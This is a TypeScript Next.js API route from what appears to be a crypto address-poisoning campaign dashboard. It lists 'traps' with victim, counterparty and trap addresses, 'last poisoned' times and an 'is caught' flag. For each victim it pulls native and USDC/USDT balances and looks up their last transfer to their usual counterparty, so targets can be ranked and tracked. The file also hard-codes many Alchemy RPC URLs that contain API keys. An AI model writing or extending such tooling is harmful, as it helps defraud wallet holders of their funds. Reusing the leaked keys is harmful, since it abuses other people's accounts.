// api/campaign/[id]/traps/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { getAuthUser } from '@app-lib/auth';
import { createServerSupabaseClient } from '@app-lib/supabaseServer';
import { createClient } from '@supabase/supabase-js';
import { createPublicClient, http, formatEther, formatUnits, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';

const chainMap = { ethereum: mainnet, bsc, polygon };
const chainIdMap: Record<string, number> = {
  ethereum: 1,
  bsc: 56,
  polygon: 137,
};

const tokenMap: Record<string, Record<string, string>> = {
  ethereum: {
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  },
  bsc: {
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    USDT: '0x55d398326f99059fF775485246999027B3197955',
  },
  polygon: {
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  },
};

const tokenDecimalsMap: Record<string, Record<string, number>> = {
  ethereum: { USDC: 6, USDT: 6 },
  bsc: { USDC: 18, USDT: 18 },
  polygon: { USDC: 6, USDT: 6 },
};

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: 'owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function',
  },
] as const;

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS: Record<string, string[]> = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

// ─── Block Explorer Configs ───
const EXPLORER_API_URLS: Record<string, string> = {
  ethereum: 'https://api.etherscan.io/api',
  bsc: 'https://api.bscscan.com/api',
  polygon: 'https://api.polygonscan.com/api',
};

const EXPLORER_API_KEYS: Record<string, string | undefined> = {
  ethereum: process.env.ETHERSCAN_API_KEY,
  bsc: process.env.BSCSCAN_API_KEY,
  polygon: process.env.POLYGONSCAN_API_KEY,
};

// ─── Indexer Helpers ───
async function fetchFromAlchemy(
  rpcUrl: string,
  fromAddress: string,
  toAddress?: string | null
): Promise<string | null> {
  try {
    const paramsObj: Record<string, any> = {
      fromBlock: '0x0',
      toBlock: 'latest',
      fromAddress: fromAddress.toLowerCase(),
      category: ['external', 'erc20'],
      order: 'desc',
      maxCount: '0x1',
      withMetadata: true,
    };
    if (toAddress) {
      paramsObj.toAddress = toAddress.toLowerCase();
    }
    const response = await fetch(rpcUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'alchemy_getAssetTransfers',
        params: [paramsObj],
      }),
    });

    if (!response.ok) return null;

    const data = await response.json();
    const transfers = data?.result?.transfers;

    if (Array.isArray(transfers) && transfers.length > 0) {
      const timestampStr = transfers[0]?.metadata?.blockTimestamp;
      if (timestampStr) {
        return new Date(timestampStr).toISOString();
      }
    }
  } catch (err) {
    console.warn('[Alchemy Indexer Error]:', err);
  }
  return null;
}

async function fetchFromExplorer(
  chain: string,
  fromAddress: string,
  toAddress?: string | null
): Promise<string | null> {
  const normalizedChain = chain.toLowerCase();
  const baseUrl = EXPLORER_API_URLS[normalizedChain];
  const apiKey = EXPLORER_API_KEYS[normalizedChain] || '';

  if (!baseUrl) return null;

  const targetTo = toAddress ? toAddress.toLowerCase() : null;

  for (const action of ['tokentx', 'txlist']) {
    try {
      const url = `${baseUrl}?module=account&action=${action}&address=${fromAddress}&sort=desc&page=1&offset=50${
        apiKey ? `&apikey=${apiKey}` : ''
      }`;

      const res = await fetch(url);
      if (!res.ok) continue;

      const contentType = res.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        continue;
      }

      const data = await res.json();

      if (data.status === '1' && Array.isArray(data.result)) {
        const match = data.result.find((tx: any) =>
          targetTo ? tx.to?.toLowerCase() === targetTo : true
        );

        if (match && match.timeStamp) {
          const timeSec = Number(match.timeStamp);
          if (!isNaN(timeSec)) {
            return new Date(timeSec * 1000).toISOString();
          }
        }
      }
    } catch (err) {
      console.warn(`[Explorer Indexer Error - ${chain}]:`, err);
    }
  }

  return null;
}

async function getLastTransferTimestamp(params: {
  chain: string;
  rpcUrl: string;
  fromAddress: string;
  toAddress?: string | null;
}): Promise<string | null> {
  const { chain, rpcUrl, fromAddress, toAddress } = params;

  if (!fromAddress) return null;

  if (rpcUrl && rpcUrl.includes('alchemy.com')) {
    const alchemyResult = await fetchFromAlchemy(rpcUrl, fromAddress, toAddress);
    if (alchemyResult) return alchemyResult;

    if (toAddress) {
      const fallbackResult = await fetchFromAlchemy(rpcUrl, fromAddress, null);
      if (fallbackResult) return fallbackResult;
    }
  }

  const explorerResult = await fetchFromExplorer(chain, fromAddress, toAddress);
  if (explorerResult) return explorerResult;

  if (toAddress) {
    return await fetchFromExplorer(chain, fromAddress, null);
  }

  return null;
}

// ─── Block timestamp cache ───
const blockTimestampCache = new Map<string, number>();
function getCachedBlockTimestamp(chainId: number, blockNumber: number): number | null {
  const key = `${chainId}-${blockNumber}`;
  return blockTimestampCache.get(key) || null;
}
function setCachedBlockTimestamp(chainId: number, blockNumber: number, timestamp: number) {
  const key = `${chainId}-${blockNumber}`;
  blockTimestampCache.set(key, timestamp);
}

// ─── Balance cache ───
const balanceCache = new Map<string, { native: string; tokens: Record<string, string>; timestamp: number }>();
const CACHE_TTL_MS = 60000;

function getCachedBalance(address: string) {
  const cached = balanceCache.get(address);
  if (cached && Date.now() - cached.timestamp < CACHE_TTL_MS) {
    return cached;
  }
  return null;
}

function setCachedBalance(address: string, native: string, tokens: Record<string, string>) {
  balanceCache.set(address, { native, tokens, timestamp: Date.now() });
}

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params;

  const user = await getAuthUser();
  if (!user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const supabase = await createServerSupabaseClient();
  const supabaseAdmin = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const { data: campaign, error: campaignError } = await supabase
    .from('campaigns')
    .select('id, chain')
    .eq('id', id)
    .eq('user_id', user.id)
    .single();

  if (campaignError || !campaign) {
    return NextResponse.json({ error: 'Campaign not found' }, { status: 404 });
  }

  const chainId = chainIdMap[campaign.chain] || 1;

  const { searchParams } = new URL(req.url);
  const limit = parseInt(searchParams.get('limit') || '20', 10);
  const offset = parseInt(searchParams.get('offset') || '0', 10);

  const { data: traps, error: trapsError, count } = await supabase
    .from('traps')
    .select('id, victim_address, counterparty_address, trap_address, last_poisoned_at, is_caught, created_at, updated_at', { count: 'exact' })
    .eq('campaign_id', id)
    .order('created_at', { ascending: false })
    .range(offset, offset + limit - 1);

  if (trapsError) {
    return NextResponse.json({ error: trapsError.message }, { status: 500 });
  }

  // ─── RPC client ───
  const chain = chainMap[campaign.chain as keyof typeof chainMap];
  const rpcUrl = process.env[`${campaign.chain.toUpperCase()}_RPC_URL`] || process.env.NODE_RPC_URL;
  if (!rpcUrl) {
    console.warn('[traps] Missing RPC URL, skipping victim balances');
    return NextResponse.json({ traps, total: count, limit, offset });
  }

  const normalizedChain = campaign.chain?.toLowerCase() || '';
  const rawUrls = [rpcUrl, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
  const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

  const client = createPublicClient({
    chain,
    transport: fallback(
      fallbackUrls.map(url => http(url, { timeout: 15000 })),
      { rank: false }
    ),
  });

  const tokenAddresses = tokenMap[campaign.chain as keyof typeof tokenMap] || {};
  const decimalsForChain = tokenDecimalsMap[campaign.chain as keyof typeof tokenDecimalsMap] || {};

  const enrichedTraps = await Promise.all(
    traps.map(async (trap) => {
      const victim = trap.victim_address as `0x${string}`;
      let nativeBalance = '0';
      let tokenBalances: Record<string, string> = {};

      if (victim) {
        const cached = getCachedBalance(victim);
        if (cached) {
          nativeBalance = cached.native;
          tokenBalances = cached.tokens;
        } else {
          try {
            const balance = await client.getBalance({ address: victim });
            nativeBalance = formatEther(balance);
          } catch (e) {
            console.warn(`[traps] Native balance failed for ${victim}:`, e);
          }
          if (Object.keys(tokenAddresses).length > 0) {
            try {
              const contractCalls = Object.entries(tokenAddresses).map(([symbol, address]) => ({
                address: address as `0x${string}`,
                abi: ERC20_ABI as any,
                functionName: 'balanceOf',
                args: [victim],
              }));
              const results = await client.multicall({ contracts: contractCalls, allowFailure: true });
              results.forEach((result, i) => {
                const symbol = Object.keys(tokenAddresses)[i];
                if (result.status === 'success' && result.result !== undefined && result.result !== null) {
                  const decimals = decimalsForChain[symbol] ?? 6;
                  tokenBalances[symbol] = formatUnits(result.result as bigint, decimals);
                } else {
                  tokenBalances[symbol] = '0';
                }
              });
            } catch (e) {
              console.warn(`[traps] Multicall failed for ${victim}:`, e);
              Object.keys(tokenAddresses).forEach((symbol) => { tokenBalances[symbol] = '0'; });
            }
          }
          setCachedBalance(victim, nativeBalance, tokenBalances);
        }
      }

      // ─── Last transfer timestamp ───
      let lastTransferAt: string | null = null;
      if (trap.victim_address) {
        const victimLower = trap.victim_address.toLowerCase();
        const counterpartyLower = trap.counterparty_address ? trap.counterparty_address.toLowerCase() : null;

        // 1. Indexer APIs (Alchemy / Explorer)
        try {
          lastTransferAt = await getLastTransferTimestamp({
            chain: campaign.chain,
            rpcUrl,
            fromAddress: trap.victim_address,
            toAddress: trap.counterparty_address,
          });
          if (lastTransferAt) {
            console.log(`[traps] ✅ Fetched timestamp via Indexer API for ${trap.id}: ${lastTransferAt}`);
          }
        } catch (e) {
          console.warn(`[traps] Indexer API lookup failed for ${trap.id}:`, e);
        }

        // 2. Supabase DB fallback
        if (!lastTransferAt) {
          let selectedRow = null;

          if (counterpartyLower) {
            const { data: exact, error: exactError } = await supabaseAdmin
              .from('token_transfers')
              .select('block_number') // 🚨 CRITICAL: Only select block_number. Ignore the flawed block_timestamp column.
              .eq('sender', victimLower)
              .eq('receiver', counterpartyLower)
              .eq('chain_id', chainId)
              .order('block_number', { ascending: false })
              .limit(1);

            if (!exactError && exact && exact.length > 0) {
              selectedRow = exact[0];
              console.log(`[traps] ✅ Exact match found in DB for ${trap.id} (Block: ${selectedRow.block_number})`);
            }
          }

          if (!selectedRow) {
            const { data: anyTransfer, error: anyError } = await supabaseAdmin
              .from('token_transfers')
              .select('block_number') // 🚨 CRITICAL: Only select block_number.
              .eq('sender', victimLower)
              .eq('chain_id', chainId)
              .order('block_number', { ascending: false })
              .limit(1);

            if (!anyError && anyTransfer && anyTransfer.length > 0) {
              selectedRow = anyTransfer[0];
              console.log(`[traps] ⚠️ Fallback transfer found in DB (any counterparty) for ${trap.id} (Block: ${selectedRow.block_number})`);
            }
          }

          // 🚨 CRITICAL FIX: Fetch true on-chain time from RPC using block_number, ignoring DB's corrupted timestamp
          if (selectedRow && selectedRow.block_number) {
            const blockNumber = selectedRow.block_number;
            const cached = getCachedBlockTimestamp(chainId, blockNumber);
            
            if (cached) {
              lastTransferAt = new Date(cached).toISOString();
            } else {
              try {
                const block = await client.getBlock({ blockNumber: BigInt(blockNumber) });
                if (block && block.timestamp) {
                  const timestampMs = Number(block.timestamp) * 1000;
                  setCachedBlockTimestamp(chainId, blockNumber, timestampMs);
                  lastTransferAt = new Date(timestampMs).toISOString();
                  console.log(`[traps] 🕒 Fetched true on-chain time for block ${blockNumber}`);
                }
              } catch (e) {
                console.warn(`[traps] Could not fetch on-chain block timestamp for block ${blockNumber}:`, e);
              }
            }
          } else {
            console.log(`[traps] ℹ️ No transfers found in DB for ${victimLower} on chain ${chainId}`);
          }
        }
      }

      return {
        ...trap,
        victim_balance: { native: nativeBalance, tokens: tokenBalances },
        last_transfer_at: lastTransferAt,
      };
    })
  );

  return NextResponse.json({ traps: enrichedTraps, total: count, limit, offset });
}